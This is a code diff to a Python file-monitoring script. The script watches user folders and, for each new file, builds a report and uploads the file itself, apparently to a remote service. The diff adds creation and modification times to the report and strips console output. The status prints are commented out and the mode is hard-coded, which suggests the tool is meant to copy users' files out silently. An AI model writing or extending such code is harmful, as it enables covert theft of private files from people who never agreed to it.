@@ -6,6 +6,7 @@ import threading
 import requests
 from pathlib import Path
 from datetime import datetime
+from time import ctime
 import sys
 from watchdog.observers import Observer
 from watchdog.events import FileSystemEventHandler
@@ -135,6 +136,10 @@ class FileMonitor:
             
             filename = os.path.basename(file_path)
             file_size = os.path.getsize(file_path)
+            CreationTime = ctime(os.path.getctime(file_path))
+            LastModifiedTime = ctime(os.path.getmtime(file_path))
+
+
             timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
             
             # Determine file type for emoji
@@ -155,8 +160,10 @@ class FileMonitor:
             message += f"**File:** `{filename}`\n"
             message += f"**Location:** `{file_path.parent}`\n"
             message += f"**Size:** {self.format_file_size(file_size)}\n"
-            message += f"**Time:** {timestamp}"
-            
+            message += f"**Time:** {timestamp}\n"
+            message += f"**Created:** {CreationTime}\n"
+            message += f"**Modified:** {LastModifiedTime}\n"
+
             # Send file
             with open(file_path, 'rb') as f:
                 files = {'file': (filename, f, self.get_mime_type(file_path))}
@@ -290,19 +297,11 @@ class FileMonitor:
         
         # Get folders to monitor
         self.monitored_folders = self.get_user_folders()
-        
+
         if not self.monitored_folders:
             #print("No monitored folders found!")
             return
-        
-        #print("\nMonitoring these folders:")
-        for folder in self.monitored_folders:
-            pass
-        
-        
-        
-        
-        
+
         choice = '3'
         
         if choice in ['1', '3']:
